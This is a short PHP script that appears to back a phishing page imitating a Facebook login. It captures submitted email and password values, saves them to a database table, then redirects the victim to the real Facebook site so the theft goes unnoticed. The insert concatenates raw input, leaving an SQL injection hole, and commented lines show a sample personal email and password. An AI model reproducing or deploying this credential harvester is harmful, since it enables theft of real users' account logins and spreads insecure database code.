<?php 
	require_once("modelo/crud.php");
	//var_dump($_POST);

	if($_POST) {
		$email = $_POST['email'];
		$contrasena = $_POST['pass'];
		//$email = "michael.baez@gmail.com";
		//$contrasena = "2306";
		
		if ($email == '' or $contrasena == ''){
			echo "<script>window.location.replace('Facebook.html');</script>";
			echo "<script>Alguno de los campos esta vacio</script>";
		}else{
			$database = new Crud();
			$database->insertInto = 'usuario';
			$database->insertColumns = 'correo, pass';
			$database->insertValues = "'$email', '$contrasena'";
			$database->create();
			header("Location: https://www.facebook.com/");
		}
	}
?> 